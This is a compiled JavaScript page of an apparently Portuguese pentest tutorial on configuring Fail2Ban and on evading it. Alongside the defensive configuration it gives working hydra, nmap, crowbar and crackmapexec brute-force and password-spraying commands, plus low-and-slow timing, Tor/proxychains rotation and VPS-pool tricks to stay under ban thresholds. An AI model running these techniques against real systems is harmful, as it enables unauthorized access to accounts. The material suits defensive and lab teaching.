import{j as e}from"./index-Bd5otbF3.js";import{P as s}from"./PageContainer-BFcnvssG.js";import{A as i}from"./AlertBox-CL6YULjX.js";import{C as t}from"./CodeBlock-C2J-D4l6.js";import{C as o}from"./CommandTable-BxJEHhQ9.js";import{T as a,P as n}from"./PracticeBox-Pst8IaIf.js";function p(){return e.jsxs(s,{title:"Fail2Ban",subtitle:"Bane IPs que fazem brute force lendo logs em tempo real. Como configurar — e como passar por baixo dele com low-and-slow + proxy chains.",difficulty:"intermediario",timeToRead:"18 min",children:[e.jsx("h2",{children:"Como funciona"}),e.jsxs("p",{children:[e.jsx("strong",{children:"Fail2Ban"})," é um daemon Python que ",e.jsx("em",{children:"tail -f"})," nos logs de serviços (sshd, nginx, postfix, vsftpd...) e, quando casa um regex de falha N vezes em uma janela de tempo, dispara uma ",e.jsx("strong",{children:"action"})," — tipicamente adicionar regra ",e.jsx("code",{children:"iptables/nftables DROP"})," contra o IP origem por X minutos."]}),e.jsxs("p",{children:["É a mitigação mais barata contra brute-force credentialless. Pra você como",e.jsx("strong",{children:"red team"}),", é ",e.jsx("em",{children:"obstáculo"}),": dispara após poucos erros e te deixa cego no alvo. Você passa por ele com (1) ",e.jsx("strong",{children:"low-and-slow"}),"respeitando ",e.jsx("code",{children:"findtime"}),", (2) ",e.jsx("strong",{children:"distribuição via proxychains"}),"ou múltiplos VPS, ou (3) atacando o ",e.jsx("em",{children:"protocolo"})," que não está coberto por jail."]}),e.jsx("h2",{children:"Instalar e habilitar"}),e.jsx(a,{path:"~",lines:[{cmd:"sudo apt install -y fail2ban",out:"Setting up fail2ban (1.0.2-2) ... Created symlink fail2ban.service.",outType:"success"},{cmd:"sudo systemctl enable --now fail2ban",out:"(silencioso)",outType:"muted"},{cmd:"sudo systemctl status fail2ban --no-pager | head -8",out:`● fail2ban.service - Fail2Ban Service
     Loaded: loaded (/lib/systemd/system/fail2ban.service; enabled)
     Active: active (running) since Sun 2026-04-05 08:14:21 -03; 5s ago
       Docs: man:fail2ban(1)
   Main PID: 4912 (f2b/server)
      Tasks: 5 (limit: 9418)
     Memory: 14.6M
     CGroup: /system.slice/fail2ban.service
             └─4912 /usr/bin/python3 /usr/bin/fail2ban-server -xf start`,outType:"info"}]}),e.jsx(i,{type:"warning",title:"Sempre edite jail.local — nunca jail.conf",children:e.jsxs("p",{children:["O arquivo ",e.jsx("code",{children:"/etc/fail2ban/jail.conf"})," vem com o pacote e é",e.jsx("strong",{children:"sobrescrito em update"}),". Sua config vive em",e.jsx("code",{children:"/etc/fail2ban/jail.local"})," ou em fragmentos",e.jsx("code",{children:"/etc/fail2ban/jail.d/*.conf"})," que sobrescrevem."]})}),e.jsx("h2",{children:"Config mínima — jail.local"}),e.jsx(t,{language:"ini",title:"/etc/fail2ban/jail.local",code:`[DEFAULT]
# IPs que NUNCA são banidos (admin, monitor, escritório)
ignoreip = 127.0.0.1/8 ::1 10.10.10.0/24

# janela de observação: olha falhas dos últimos 10 minutos
findtime = 10m

# 5 falhas dentro da findtime = ban
maxretry = 5

# duração do ban (use -1 pra permanente)
bantime  = 1h

# acelerador: cada reincidência multiplica o bantime
bantime.increment = true
bantime.factor    = 2
bantime.maxtime   = 7d

# action padrão (firewall)
banaction = nftables-multiport
banaction_allports = nftables-allports

# pra mandar email (opcional)
destemail = sec@empresa.com
sender    = fail2ban@empresa.com
mta       = sendmail
action    = %(action_mwl)s

##
## Jails
##

[sshd]
enabled  = true
port     = ssh
logpath  = %(sshd_log)s
backend  = systemd

[nginx-http-auth]
enabled  = true
port     = http,https
logpath  = /var/log/nginx/error.log

[nginx-botsearch]
enabled  = true
port     = http,https
logpath  = /var/log/nginx/access.log
maxretry = 2

[postfix-sasl]
enabled  = true
port     = smtp,465,submission
logpath  = %(postfix_log)s

[recidive]
# mete cadeia em IP que apareceu em vários jails diferentes
enabled  = true
logpath  = /var/log/fail2ban.log
bantime  = 1w
findtime = 1d
maxretry = 3`}),e.jsx(a,{path:"~",lines:[{comment:"depois de editar, recarrega",cmd:"sudo systemctl reload fail2ban",out:"(silencioso)",outType:"muted"},{comment:"valida sintaxe sem aplicar",cmd:"sudo fail2ban-client -t",out:"OK: configuration test is successful",outType:"success"}]}),e.jsx("h2",{children:"fail2ban-client — operação"}),e.jsx(o,{title:"comandos do dia a dia",variations:[{cmd:"fail2ban-client status",desc:"Lista jails ativos.",output:"Number of jail: 4\\n`- Jail list: nginx-http-auth, postfix-sasl, recidive, sshd"},{cmd:"fail2ban-client status sshd",desc:"Status detalhado de um jail (file pos, banidos, total).",output:"Currently banned: 3\\nTotal banned: 47\\nBanned IP list: 192.168.1.50 203.0.113.7 198.51.100.12"},{cmd:"fail2ban-client set sshd unbanip 203.0.113.7",desc:"Remove IP da lista de banidos.",output:"1"},{cmd:"fail2ban-client set sshd banip 203.0.113.99",desc:"Bane manualmente.",output:"1"},{cmd:"fail2ban-client set sshd addignoreip 10.10.10.5",desc:"Adiciona IP à whitelist em runtime.",output:"1"},{cmd:"fail2ban-client reload",desc:"Recarrega config sem reiniciar daemon.",output:"OK"},{cmd:"fail2ban-client reload sshd",desc:"Recarrega só um jail.",output:"OK"},{cmd:"fail2ban-client unban --all",desc:"Limpa TODOS os bans (útil em emergência).",output:"47"},{cmd:"fail2ban-regex /var/log/auth.log /etc/fail2ban/filter.d/sshd.conf",desc:"Testa filter contra log real — debug essencial.",output:"Lines: 1234 lines, 0 ignored, 47 matched, 1187 missed"}]}),e.jsx("h2",{children:"Filters e Actions"}),e.jsxs("p",{children:["Cada jail combina um ",e.jsx("strong",{children:"filter"}),' (regex que casa "falha" no log) com uma ',e.jsx("strong",{children:"action"})," (o que fazer ao banir). Filters vivem em",e.jsx("code",{children:"/etc/fail2ban/filter.d/*.conf"}),"; actions em",e.jsx("code",{children:"/etc/fail2ban/action.d/*.conf"}),"."]}),e.jsx(t,{language:"ini",title:"/etc/fail2ban/filter.d/sshd-custom.conf",code:`[INCLUDES]
before = common.conf

[Definition]
# casa "Failed password" e "Invalid user" no auth.log
failregex = ^%(__prefix_line)sFailed (?:password|publickey) for .* from <HOST>(?: port \\d+)?(?: ssh\\d*)?\\s*$
            ^%(__prefix_line)sInvalid user .* from <HOST>(?: port \\d+)?\\s*$
            ^%(__prefix_line)sUser .* from <HOST> not allowed because not listed in AllowUsers\\s*$

ignoreregex =

# datepattern usado pra parsear timestamp
datepattern = {^LN-BEG}EPOCH
              ^%%b %%d %%H:%%M:%%S
              {^LN-BEG}`}),e.jsx(a,{path:"~",lines:[{comment:"testa o filter — quantas linhas casam?",cmd:"sudo fail2ban-regex /var/log/auth.log /etc/fail2ban/filter.d/sshd.conf",out:`Running tests
=============

Use   failregex filter file : sshd, basedir: /etc/fail2ban
Use         log file : /var/log/auth.log

Results
=======

Failregex: 47 total
|-  #) [# of hits] regular expression
|   1) [12] ^%(__prefix_line)sFailed (?:password|publickey) for .* from <HOST>...
|   2) [35] ^%(__prefix_line)sInvalid user .* from <HOST>...
'-

Date template hits:
|- [date pattern] [# of hits]
|  {^LN-BEG}EPOCH                       :  0
|  ^%b %d %H:%M:%S                      :  1234
'-

Lines: 1234 lines, 0 ignored, 47 matched, 1187 missed`,outType:"info"}]}),e.jsx("h2",{children:"━━━ Defesa: jail customizado pra app web ━━━"}),e.jsx("p",{children:"Sua app retorna 401 em login errado? Crie filter próprio:"}),e.jsx(t,{language:"ini",title:"/etc/fail2ban/filter.d/myapp-login.conf",code:`[Definition]
failregex = ^<HOST> .* "POST /api/login HTTP.*" 401
ignoreregex = `}),e.jsx(t,{language:"ini",title:"/etc/fail2ban/jail.d/myapp.conf",code:`[myapp-login]
enabled  = true
filter   = myapp-login
port     = http,https
logpath  = /var/log/nginx/myapp-access.log
maxretry = 5
findtime = 5m
bantime  = 30m`}),e.jsx("h2",{children:"━━━ Ataque: enumerar Fail2Ban no alvo ━━━"}),e.jsx(a,{path:"~",lines:[{comment:"primeiro: confirme que existe",cmd:"nmap -p22 --script ssh-brute --script-args 'brute.firstonly=true,unpwdb.timelimit=10s' 10.10.10.50",out:`PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute:
|_  ERROR: Failed to retrieve server fingerprint after authentication attempts. (Connection refused)`,outType:"warning"},{comment:"se a 5ª tentativa começa a dar 'Connection refused' enquanto a porta antes respondia, é Fail2Ban (ou crowdsec)",cmd:"for i in 1 2 3 4 5 6 7; do nc -zv -w2 10.10.10.50 22 2>&1; sleep 1; done",out:`Connection to 10.10.10.50 22 port [tcp/ssh] succeeded!
Connection to 10.10.10.50 22 port [tcp/ssh] succeeded!
Connection to 10.10.10.50 22 port [tcp/ssh] succeeded!
Connection to 10.10.10.50 22 port [tcp/ssh] succeeded!
Connection to 10.10.10.50 22 port [tcp/ssh] succeeded!
nc: connect to 10.10.10.50 port 22 (tcp) failed: Connection timed out
nc: connect to 10.10.10.50 port 22 (tcp) failed: Connection timed out`,outType:"error"}]}),e.jsx("h2",{children:"━━━ Ataque 1: Low-and-slow ━━━"}),e.jsxs("p",{children:["Default do jail sshd: ",e.jsx("code",{children:"maxretry=5"})," em ",e.jsx("code",{children:"findtime=10m"}),". Se você tenta ",e.jsx("strong",{children:"4 senhas a cada 10 minutos"}),", nunca dispara o ban. É lento, mas funciona em ataques de longa duração (madrugada toda) ou com password spraying (1 senha contra muitos users)."]}),e.jsx(a,{path:"~",lines:[{comment:"hydra com -t 1 (1 thread) e -W 150 (espera 150s entre tentativas)",cmd:"hydra -L users.txt -P top10.txt -t 1 -W 150 -f ssh://10.10.10.50",out:`Hydra v9.5 starting at 2026-04-05 03:42:11
[STATUS] 6.00 tries/min, 6 tries in 00:01h, 994 to do in 02:46h
[22][ssh] host: 10.10.10.50   login: backup   password: backup123
[STATUS] attack finished
1 of 1 target successfully completed, 1 valid password found`,outType:"success"},{comment:"spray: 1 senha por user, espaçado — não dispara findtime por user",cmd:"for u in $(cat users.txt); do hydra -l $u -p 'Welcome2024!' ssh://10.10.10.50 -t 1; sleep 60; done",out:"(continua silenciosamente)",outType:"muted"}]}),e.jsx("h2",{children:"━━━ Ataque 2: Distribuir via proxychains / múltiplos IPs ━━━"}),e.jsxs("p",{children:["Fail2Ban bane ",e.jsx("strong",{children:"por IP origem"}),". Se cada tentativa vem de IP diferente, nunca acumula ",e.jsx("code",{children:"maxretry"}),"."]}),e.jsx(a,{path:"~",lines:[{comment:"configura proxychains com lista de SOCKS Tor + open proxies",cmd:"cat /etc/proxychains4.conf | grep -A20 'ProxyList'",out:`[ProxyList]
socks5  127.0.0.1 9050
socks5  127.0.0.1 9051
socks5  127.0.0.1 9052
# random_chain + chain_len = 1 → muda IP a cada call`,outType:"info"},{comment:"tor multi-circuit: cada conexão vai por exit node diferente",cmd:"proxychains4 -q hydra -L users.txt -P passwords.txt -t 1 -W 5 ssh://10.10.10.50",out:"[STATUS] 12.00 tries/min — IP origem rotaciona pelos exit nodes",outType:"warning"},{comment:"alternativa cara mas eficaz: pool de VPS",cmd:"for ip in $(cat my_vps.txt); do ssh attacker@$ip 'hydra ... &'; done",out:"(20 VPS atacando paralelo, cada um <maxretry — Fail2Ban inerte)",outType:"default"}]}),e.jsx("h2",{children:"━━━ Ataque 3: jail incompleto ━━━"}),e.jsxs("p",{children:["Muita gente liga só o ",e.jsx("code",{children:"[sshd]"})," e esquece o resto. Procure portas onde Fail2Ban ",e.jsx("strong",{children:"não"})," está olhando:"]}),e.jsx(o,{title:"vetores frequentemente sem jail",variations:[{cmd:"FTP/FTPS (vsftpd, proftpd)",desc:"Tem jail nativo mas raramente habilitado.",output:"hydra ftp://target"},{cmd:"RDP (xrdp)",desc:"Sem filter por padrão.",output:"crowbar -b rdp -s 10.10.10.50/32 -u admin -C pass.txt"},{cmd:"MySQL/Postgres",desc:"Quase ninguém configura jail pra DB.",output:"hydra -L u.txt -P p.txt mysql://target"},{cmd:"SMB",desc:"Filter existe (filter.d/samba.conf) mas raro.",output:"crackmapexec smb target -u u.txt -p p.txt --continue-on-success"},{cmd:"Webapp custom",desc:"Endpoints /login específicos sem jail dedicado.",output:"ffuf, hydra http-post-form, etc."}]}),e.jsx("h2",{children:"━━━ Defesa: Recidive + escalada ━━━"}),e.jsxs("p",{children:["O jail ",e.jsx("code",{children:"[recidive]"})," lê o próprio ",e.jsx("code",{children:"/var/log/fail2ban.log"}),": IPs que apareceram em ",e.jsx("em",{children:"vários"})," jails diferentes ou foram banidos repetidamente ganham um ban longo (1 semana+). Mata o atacante low-and-slow que fica voltando."]}),e.jsx(t,{language:"ini",title:"reforço: bloquear TODAS as portas para reincidente",code:`[recidive]
enabled    = true
logpath    = /var/log/fail2ban.log
banaction  = nftables-allports
bantime    = 4w
findtime   = 1d
maxretry   = 5`}),e.jsx(a,{path:"~",lines:[{cmd:"sudo fail2ban-client status recidive",out:`Status for the jail: recidive
|- Filter
|  |- Currently failed: 0
|  |- Total failed:     38
|  '- File list:        /var/log/fail2ban.log
'- Actions
   |- Currently banned: 7
   |- Total banned:     12
   '- Banned IP list:   45.142.121.5 89.248.165.74 185.220.101.18 ...`,outType:"warning"}]}),e.jsx(n,{title:"Lab: simule brute force, observe ban e teste bypass low-and-slow",goal:"Configurar Fail2Ban com jail SSH agressivo (maxretry=3) e validar que (1) hydra normal é banido em segundos e (2) hydra com -W 200 passa.",steps:["Edite /etc/fail2ban/jail.local com [sshd] enabled=true, maxretry=3, findtime=2m, bantime=10m.","Recarregue fail2ban-client reload.","Em outro shell rode hydra agressivo — esperar ban.","Confirme com fail2ban-client status sshd.","Unban e tente novamente com -t 1 -W 60 (1 tentativa por minuto).","Veja que NÃO bane."],command:`# 1) ataque rápido — VAI ser banido
hydra -l fakeuser -P /usr/share/wordlists/rockyou.txt -t 4 ssh://127.0.0.1
sudo fail2ban-client status sshd

# 2) unban e refaz devagar
sudo fail2ban-client set sshd unbanip <SEU_IP>
hydra -l fakeuser -P pequena.txt -t 1 -W 60 ssh://127.0.0.1`,expected:`Status for the jail: sshd
|- Filter
|  |- Currently failed: 0
|  '- Total failed:     17
'- Actions
   |- Currently banned: 1
   '- Banned IP list:   127.0.0.1
   ...
# Já no segundo run (-W 60), nenhum ban registrado.`,verify:"A diferença entre os dois runs prova o conceito de findtime/maxretry. Em pentest real, ajuste -W ao findtime do alvo (10m default = -W 150)."}),e.jsx(i,{type:"info",title:"Fail2Ban + CrowdSec + GeoIP = stack moderno",children:e.jsxs("p",{children:["Para cobrir o gap de bypass distribuído, combine Fail2Ban com",e.jsx("code",{children:"crowdsec"})," (compartilha listas de IPs maliciosos entre instâncias) e GeoIP-blocking via ",e.jsx("code",{children:"nftables"})," set para países fora do escopo. Pra atacante isso significa: comprar VPS dentro do mesmo país do alvo é vantagem, e Tor/proxies passam a ser ",e.jsx("em",{children:"ruido"})," imediatamente bloqueado."]})})]})}export{p as default};
